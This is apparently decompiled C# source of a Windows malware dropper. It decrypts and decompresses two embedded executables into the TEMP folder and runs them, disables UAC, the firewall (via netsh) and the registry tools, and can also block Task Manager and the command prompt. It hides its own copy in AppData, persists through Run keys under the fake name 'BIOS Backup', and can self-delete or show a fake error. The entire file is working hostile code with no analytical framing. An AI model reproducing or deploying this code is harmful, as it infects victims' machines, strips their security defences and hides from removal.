using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal static class Class0
{
	private static string string_0 = "b36fe3d62e23dcc23562268f6b3be2b8";

	private static string string_1 = "b36fe3d62e23dcc23562268f6b3be2b8";

	private static string[] string_2 = new string[2] { "isrdy.exe", "cgrdy.exe" };

	private static string string_3 = "OPkvnYX1fxRcogNSYf";

	private static bool bool_0 = true;

	private static bool bool_1 = true;

	private static bool bool_2 = true;

	private static bool bool_3 = true;

	private static bool bool_4 = true;

	private static bool bool_5 = true;

	private static bool bool_6 = true;

	private static bool bool_7 = true;

	private static bool bool_8 = true;

	private static bool bool_9 = true;

	private static bool bool_10 = true;

	private static bool bool_11 = true;

	private static bool bool_12 = true;

	private static bool bool_13 = true;

	private static bool bool_14 = true;

	private static bool bool_15 = true;

	private static bool bool_16 = false;

	private static string string_4 = "ValuefakeErrorTitle";

	private static string string_5 = "ValuefakeErrorMessage";

	private static bool bool_17 = true;

	private static bool bool_18 = false;

	private static bool bool_19 = true;

	private static bool bool_20 = true;

	private static bool bool_21 = false;

	private static bool bool_22 = false;

	private static bool bool_23 = true;

	private static string string_6 = "VV3M8z7iqYPv.exe";

	private static bool bool_24 = false;

	[CompilerGenerated]
	private static ThreadStart threadStart_0;

	private static void smethod_0(string string_7, string string_8)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(string_7, string_8, (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static byte[] smethod_1(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(byte_0, 0, byte_0.Length);
		memoryStream.Position = 0L;
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
		MemoryStream memoryStream2 = new MemoryStream();
		byte[] array = new byte[64];
		int num = -1;
		for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream2.Write(array, 0, num);
		}
		gZipStream.Close();
		return memoryStream2.ToArray();
	}

	private static byte[] smethod_2(string string_7)
	{
		return Convert.FromBase64String(string_7);
	}

	private static byte[] smethod_3(byte[] byte_0, string string_7)
	{
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(string_7, Encoding.Default.GetBytes(string_7));
		MemoryStream memoryStream = new MemoryStream();
		Rijndael rijndael = Rijndael.Create();
		rijndael.Key = passwordDeriveBytes.GetBytes(32);
		rijndael.IV = passwordDeriveBytes.GetBytes(16);
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(byte_0, 0, byte_0.Length);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}

	public static string smethod_4(int int_0)
	{
		string text = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_0; i++)
		{
			stringBuilder.Append(text[random.Next(text.Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void Main()
	{
		if (!(string_0 == string_1))
		{
			return;
		}
		if (bool_16)
		{
			try
			{
				new Thread((ThreadStart)delegate
				{
					smethod_0(string_5, string_4);
				}).Start();
			}
			catch
			{
			}
		}
		for (int i = 0; i < string_2.Length; i++)
		{
			try
			{
				StreamReader streamReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("ressource" + i));
				string s = streamReader.ReadToEnd();
				streamReader.Close();
				byte[] byte_ = Convert.FromBase64String(s);
				byte[] byte_2 = smethod_3(byte_, string_3);
				byte[] bytes = smethod_1(byte_2);
				File.WriteAllBytes(Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2[i], bytes);
			}
			catch
			{
			}
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2[i];
				process.Start();
			}
			catch
			{
			}
		}
		if (bool_17)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				if (registryKey == null)
				{
					Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				}
				registryKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				if (registryKey2 == null)
				{
					Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				}
				registryKey2.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			if (bool_18)
			{
				try
				{
					RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true);
					if (registryKey3 == null)
					{
						Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
					}
					registryKey3.SetValue("DisableCMD", "1", RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			if (bool_19)
			{
				try
				{
					Process process2 = new Process();
					process2.StartInfo.FileName = "Netsh";
					process2.StartInfo.Arguments = "Advfirewall set Currentprofile State off";
					process2.StartInfo.UseShellExecute = false;
					process2.StartInfo.CreateNoWindow = true;
					process2.Start();
				}
				catch
				{
				}
			}
			if (bool_20)
			{
				try
				{
					RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
					if (registryKey4 == null)
					{
						Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					}
					registryKey4.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			if (bool_21)
			{
				try
				{
					RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
					if (registryKey5 == null)
					{
						Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
					}
					registryKey5.SetValue("DisallowRun", "1", RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			if (bool_22)
			{
				try
				{
					RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
					if (registryKey6 == null)
					{
						Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					}
					registryKey6.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
		}
		if (bool_23)
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_6;
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				File.WriteAllBytes(text, File.ReadAllBytes(Application.get_ExecutablePath()));
				File.SetAttributes(text, FileAttributes.Hidden);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("BIOS Backup", text);
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("BIOS Backup", text);
			}
			catch
			{
			}
		}
		if (bool_24)
		{
			try
			{
				File.WriteAllText(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat", ":Repeat\ndel \"" + Application.get_ExecutablePath() + "\"\nif exist \"" + Application.get_ExecutablePath() + "\" goto Repeat");
				Process process3 = new Process();
				process3.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat";
				process3.StartInfo.UseShellExecute = false;
				process3.StartInfo.CreateNoWindow = true;
				process3.Start();
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private static void smethod_5()
	{
		smethod_0(string_5, string_4);
	}
}
